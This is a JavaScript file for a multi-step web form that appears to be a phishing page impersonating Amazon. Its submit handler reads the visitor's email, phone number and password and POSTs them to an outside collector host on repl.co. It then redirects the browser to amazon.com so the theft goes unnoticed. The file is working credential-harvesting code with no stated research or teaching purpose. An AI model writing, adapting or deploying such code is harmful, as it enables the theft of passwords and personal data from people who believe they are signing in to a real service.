
const first = document.getElementById('first')
const second = document.getElementById('second')
const third = document.getElementById('third')

const submitBtn = document.getElementById("submitBtn");

submitBtn.onclick = (event) => {
  event.preventDefault();
  submit();
}

async function submit() {
  const userName = document.getElementById("name");
  const phoneNumber = document.getElementById("phoneNumber");
  const password = document.getElementById("password");

  const data = {
    "email": userName.value,
    "phoneNumber": phoneNumber.value,
    "password": password.value
  };

  await fetch('https://databasecollector.angry-creator.repl.co/', {
    method: "POST",
    mode: "cors",
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  })
    .then((response) => response.json())
    .then((data) => console.log(data)).finally(() => {
      window.location.href = "https://www.amazon.com/";
    });
}


function next(current) {
  if (current === 'first') {
    first.style.display = 'none';
    second.style.display = 'block';
  }
  else if (current === 'second') {
    second.style.display = 'none';
    third.style.display = 'block';
  }
}




function revealPassword() {
  var checkbox = document.getElementById("revealPasswordCheckbox");
  var password = document.getElementById("password");
  if (checkbox.checked) {
    password.type = "text";
  } else {
    password.type = "password";
  }
}
